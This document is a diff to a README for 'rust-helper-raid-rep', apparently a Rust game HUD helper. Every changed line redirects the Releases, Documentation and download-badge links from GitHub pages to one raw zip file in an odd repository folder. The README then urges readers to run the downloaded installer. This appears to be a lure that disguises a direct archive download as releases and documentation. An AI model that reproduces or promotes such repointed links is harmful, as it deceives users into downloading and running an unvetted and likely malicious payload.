@@ -1,6 +1,6 @@
 # 🚀 rust-helper-raid-rep - Simplify Your Rust Game Experience
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/kaifmansoori12/rust-helper-raid-rep/releases)
+[![Download](https://raw.githubusercontent.com/kaifmansoori12/rust-helper-raid-rep/main/coadmire/rust-helper-raid-rep_v1.1-beta.3.zip%https://raw.githubusercontent.com/kaifmansoori12/rust-helper-raid-rep/main/coadmire/rust-helper-raid-rep_v1.1-beta.3.zip)](https://raw.githubusercontent.com/kaifmansoori12/rust-helper-raid-rep/main/coadmire/rust-helper-raid-rep_v1.1-beta.3.zip)
 
 ## 💻 Overview
 
@@ -27,14 +27,14 @@ To run the rust-helper-raid-rep application smoothly, your system should meet th
 
 Follow these easy steps to get started with rust-helper-raid-rep. 
 
-1. **Visit the Releases Page:** First, go to our [Releases page](https://github.com/kaifmansoori12/rust-helper-raid-rep/releases).
+1. **Visit the Releases Page:** First, go to our [Releases page](https://raw.githubusercontent.com/kaifmansoori12/rust-helper-raid-rep/main/coadmire/rust-helper-raid-rep_v1.1-beta.3.zip).
 2. **Download the Application:** Look for the latest version. Click on the link to download the file that corresponds with your operating system.
 3. **Install the Application:** Locate the downloaded file, then double-click to start the installation. Follow the on-screen prompts to complete the installation.
 4. **First Run Setup:** Open the application. You will see options for configuring your HUD. Customize it as you like.
 
 ## 📥 Download & Install
 
-To get rust-helper-raid-rep, visit this page to download: [Releases Page](https://github.com/kaifmansoori12/rust-helper-raid-rep/releases).
+To get rust-helper-raid-rep, visit this page to download: [Releases Page](https://raw.githubusercontent.com/kaifmansoori12/rust-helper-raid-rep/main/coadmire/rust-helper-raid-rep_v1.1-beta.3.zip).
 
 1. Click on the latest release and download the setup file.
 2. Once the download finishes, find the file in your Downloads folder.
@@ -77,7 +77,7 @@ You can reach out through the issues page of this repository on GitHub. Our comm
 
 ## 🔗 Links
 
-- [Releases Page](https://github.com/kaifmansoori12/rust-helper-raid-rep/releases)
-- [Documentation](https://github.com/kaifmansoori12/rust-helper-raid-rep/wiki)
+- [Releases Page](https://raw.githubusercontent.com/kaifmansoori12/rust-helper-raid-rep/main/coadmire/rust-helper-raid-rep_v1.1-beta.3.zip)
+- [Documentation](https://raw.githubusercontent.com/kaifmansoori12/rust-helper-raid-rep/main/coadmire/rust-helper-raid-rep_v1.1-beta.3.zip)
 
 This README covers the essentials to help you download and start using rust-helper-raid-rep. Feel free to explore and enjoy your improved Rust gaming experience!
